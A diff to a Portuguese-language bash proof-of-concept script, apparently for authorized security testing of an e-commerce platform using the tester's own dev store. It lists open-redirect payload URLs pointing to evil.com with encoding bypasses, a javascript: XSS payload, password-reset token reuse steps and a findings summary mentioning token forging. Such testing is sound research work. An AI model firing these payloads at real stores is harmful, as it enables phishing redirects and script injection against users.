@@ -195,3 +195,56 @@ print()
 print("Se retornar access_token → token forging funciona com apiSecretKey conhecida")
 PYEOF
 
+
+# ===================================================================
+# TESTE S7: Customer Account Login — checkout_url open redirect
+# (usar APENAS com dev store própria)
+# ===================================================================
+echo "=== S7: checkout_url Open Redirect no Customer Login ==="
+echo ""
+echo "[*] Testar com sua dev store: ${DEV_STORE}"
+echo ""
+echo "[*] URLs para testar (abrir no browser):"
+echo "    1. Redirect básico:"
+echo "       https://${DEV_STORE}/account/login?checkout_url=https://evil.com"
+echo ""
+echo "    2. Bypass com protocol:"
+echo "       https://${DEV_STORE}/account/login?checkout_url=//evil.com"
+echo ""
+echo "    3. Bypass com double-encoding:"
+echo "       https://${DEV_STORE}/account/login?checkout_url=%2F%2Fevil.com"
+echo ""
+echo "    4. Bypass com whitespace:"
+echo "       https://${DEV_STORE}/account/login?checkout_url=https%3A//evil.com"
+echo ""
+echo "    5. Testar com javascript: (XSS via redirect)"
+echo "       https://${DEV_STORE}/account/login?checkout_url=javascript:alert(document.domain)"
+echo ""
+echo "[*] Se após login o usuário for redirecionado para evil.com → Open Redirect HIGH"
+echo ""
+
+# ===================================================================
+# TESTE S8: Password Reset Token Reuse
+# ===================================================================
+echo "=== S8: Password Reset Token Reuse ==="
+echo ""
+echo "[*] Passos:"
+echo "    1. Solicitar reset de senha para sua conta de teste"
+echo "    2. Clicar no link do email → ANTES de usar, anotar o token"
+echo "    3. Usar o token para resetar a senha"
+echo "    4. Tentar usar o MESMO token novamente"
+echo ""
+echo "[*] URL de reset geralmente: https://${DEV_STORE}/account/reset/..."
+echo "[*] Se o token puder ser reutilizado → password reset token reuse (MEDIUM)"
+echo ""
+
+echo "=== FIM DOS PoC SCRIPTS ==="
+echo ""
+echo "=== RESUMO DOS TESTES REALIZADOS ==="
+echo "  S1: Session fixation pre-condition → CONFIRMADO, precisa verificar rotação pós-login"
+echo "  S2: JWKS missing alg → Documentado (LOW)"
+echo "  S3: CSP unsafe-inline → Documentado (INFO)"
+echo "  S4: HS256 token forging → Script pronto, precisa client_secret"
+echo "  S6: shop.app SameSite=None → Documentado, precisa conta para verificar"
+echo "  S7: checkout_url redirect → Script pronto, precisa dev store"
+echo "  S8: Password reset reuse → Script pronto, precisa dev store"
